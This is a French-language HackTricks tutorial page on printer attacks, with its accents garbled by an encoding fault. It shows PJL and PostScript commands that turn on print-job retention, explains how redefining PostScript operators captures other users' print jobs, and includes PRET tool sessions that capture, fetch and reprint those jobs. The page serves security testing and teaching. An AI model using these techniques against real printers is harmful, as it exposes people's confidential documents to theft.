<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Conservation des travaux d'impression

Certaines imprimantes ont des travaux d'impression stock√©s accessibles depuis le serveur web. Habituellement, cependant, la conservation des travaux doit √™tre explicitement activ√©e pour un travail d'impression donn√© et peut √™tre r√©alis√©e en utilisant des commandes PJL standard ou du code PostScript propri√©taire. Les travaux sont alors conserv√©s en m√©moire et peuvent √™tre r√©imprim√©s √† partir du panneau de contr√¥le.

## PJL

La conservation l√©gitime d'un travail peut √™tre activ√©e pour le document actuel en d√©finissant la variable PJL HOLD comme indiqu√© ci-dessous :
```
@PJL SET HOLD=ON
[actual data to be printed follows]
```
Les travaux en attente sont conserv√©s en m√©moire et peuvent √™tre r√©imprim√©s √† partir du panneau de contr√¥le de l'imprimante. Cette fonctionnalit√© est prise en charge par diverses imprimantes, cependant il semble que seuls certains appareils Epson permettent de d√©finir la r√©tention permanente des travaux en utilisant `@PJL DEFAULT HOLD=ON`.

**Comment tester cette attaque ?**

Utilisez la commande `hold` de [**PRET**](https://github.com/RUB-NDS/PRET) en mode pjl pour v√©rifier si la r√©tention permanente des travaux peut √™tre d√©finie :
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Setting job retention, reconnecting to see if still enabled
Retention for future print jobs: OFF
```
## PostScript

PostScript offre des fonctionnalit√©s similaires qui sont cependant sp√©cifiques au mod√®le et au fabricant. Pour la s√©rie HP LaserJet 4k et diverses imprimantes Kyocera, la r√©tention de travaux peut √™tre activ√©e en pr√©fixant les commandes suivantes √† un document PostScript :
```
<< /Collate true /CollateDetails
<< /Hold 1 /Type 8 >> >> setpagedevice
```
Bien qu'il soit th√©oriquement possible d'activer de mani√®re permanente la r√©tention de travaux PostScript en utilisant l'op√©rateur [startjob ](./#postscript-ps), ce param√®tre est explicitement r√©initialis√© par CUPS au d√©but de chaque travail d'impression en utilisant `<< /Collate false >> setpagedevice`. Cependant, pour contrer ce m√©canisme de protection, l'attaquant peut red√©finir de mani√®re permanente l'op√©rateur `setpagedevice` pour qu'il n'ait aucun effet.

**Comment tester cette attaque ?**

Utilisez la commande `hold` de [**PRET** ](https://github.com/RUB-NDS/PRET) en mode ps :
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Job retention enabled.
```
# Capture de travaux

Il est possible, mais peu commun, d'activer la r√©tention de travaux dans la bo√Æte de dialogue d'impression comme mentionn√© ci-dessus. Cependant, avec PostScript, on a un contr√¥le total sur le travail d'impression actuel et avec l'op√©rateur [startjob](./#postscript-ps), il est m√™me possible de sortir de la boucle du serveur et d'acc√©der aux travaux futurs. Une telle fonctionnalit√© a le potentiel de capturer tous les documents si PostScript est utilis√© comme pilote d'imprimante.

## PostScript

Avec la capacit√© de se brancher sur des op√©rateurs PostScript arbitraires, il est possible de manipuler et d'acc√©der √† des travaux d'impression √©trangers. Pour **analyser le flux de donn√©es r√©el envoy√© √† l'imprimante**, on peut utiliser une fonctionnalit√© assez cool du langage PostScript : lire son propre code programme comme des donn√©es en utilisant l'op√©rateur `currentfile`. De cette mani√®re, l'ensemble du flux de donn√©es √† traiter par l'interpr√©teur PostScript peut √™tre acc√©d√© en le lisant et stock√© dans un fichier sur le p√©riph√©rique d'impression. Si l'imprimante n'offre pas d'acc√®s au syst√®me de fichiers, **les documents captur√©s peuvent √™tre stock√©s en m√©moire**, par exemple dans des dictionnaires PostScript permanents. \
Un probl√®me pratique est de d√©cider **quel op√©rateur devrait √™tre intercept√©** car on n'a pas acc√®s au flux de donn√©es avant que cet op√©rateur soit trait√© par l'interpr√©teur PostScript. Comme un attaquant veut capturer les travaux d'impression d√®s le d√©but, l'**op√©rateur red√©fini doit √™tre le tout premier op√©rateur** contenu dans le document PostScript. Heureusement, tous les documents imprim√©s avec CUPS sont contraints √† une structure fixe commen√ßant par `currentfile /ASCII85Decode filter /LZWDecode filter cvx exec`. En se basant sur l'hypoth√®se d'une telle structure fixe, l'attaquant peut capturer les documents d√®s le d√©but et ex√©cuter (c'est-√†-dire imprimer) le fichier par la suite. Pour les syst√®mes d'impression **autres que CUPS**, cette attaque devrait √©galement √™tre possible, mais **les op√©rateurs doivent √™tre adapt√©s**. Notez que l'en-t√™te PostScript qui inclut g√©n√©ralement la taille du support, le nom de l'utilisateur et du travail ne peut pas √™tre captur√© en utilisant cette m√©thode car nous nous branchons d'abord au d√©but du document r√©el. Une autre strat√©gie g√©n√©rique pour se brancher au d√©but de chaque travail d'impression est de d√©finir le param√®tre syst√®me `BeginPage`, s'il est pris en charge par l'imprimante (la plupart des imprimantes le font). Cette vuln√©rabilit√© est probablement pr√©sente dans les dispositifs d'impression depuis des d√©cennies car seuls les constructions de langage d√©finies par la norme PostScript sont exploit√©es.

Utilisez la commande `capture` de [**PRET**](https://github.com/RUB-NDS/PRET) en mode ps :
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.

printer:/> capture
Print job operations:  capture <operation>
capture start   - Record future print jobs.
capture stop    - End capturing print jobs.
capture list    - Show captured print jobs.
capture fetch   - Save captured print jobs.
capture print   - Reprint saved print jobs.
printer:/> capture start
Future print jobs will be captured in memory!
printer:/> exit
```
Maintenant, imprimez des documents arbitraires (assurez-vous que PRET est d√©connect√© pour ne pas bloquer le canal d'impression). Ensuite, vous pouvez lister, r√©cup√©rer ou r√©imprimer les documents captur√©s :
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> capture list
Free virtual memory: 16.6M | Limit to capture:  5.0M
date          size  user           jobname                 creator
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Jan 25 18:38  3.1M  -              -                       -
Jan 25 18:40  170K  -              -                       -
printer:/> capture fetch
Receiving capture/printer/690782792
3239748 bytes received.
Receiving capture/printer/690646210
174037 bytes received.
printer:/> capture print
printing...
printing...
2 jobs reprinted
printer:/> capture stop
Stopping job capture, deleting recorded jobs
```
<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
